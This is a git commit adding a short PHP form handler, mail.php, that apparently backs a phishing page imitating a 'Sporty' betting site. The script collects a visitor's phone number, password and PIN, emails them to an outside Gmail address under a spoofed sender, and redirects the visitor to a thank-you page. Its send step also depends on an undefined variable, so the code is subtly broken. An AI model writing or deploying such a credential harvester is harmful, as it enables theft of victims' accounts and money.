ad92a9de8492704e4c1e1df68304088684e73b3b
Ikemma3082 <80706383+Ikemma3082@users.noreply.github.com>
2022-08-31 08:10:49 -0700

    initial commit

---
+++ mail.php
@@ -0,0 +1,19 @@
+<?php
+//get data from form  
+
+$phone = $_POST['phone'];
+$password= $_POST['password'];
+$pin= $_POST['pin'];
+
+$to = "mezieprogrammer@gmail.com";
+
+$subject = "Mail From Sporty website";
+$txt ="Phone = ". $phone . "\r\n  Password = " . $password . "\r\n Pin =" . $pin;
+$headers = "From: noreply@codeconia.com" . "\r\n" .
+"CC: somebodyelse@example.com";
+if($email!=NULL){
+    mail($to,$subject,$txt,$headers);
+}
+//redirect
+header("Location:thankyou.html");
+?>
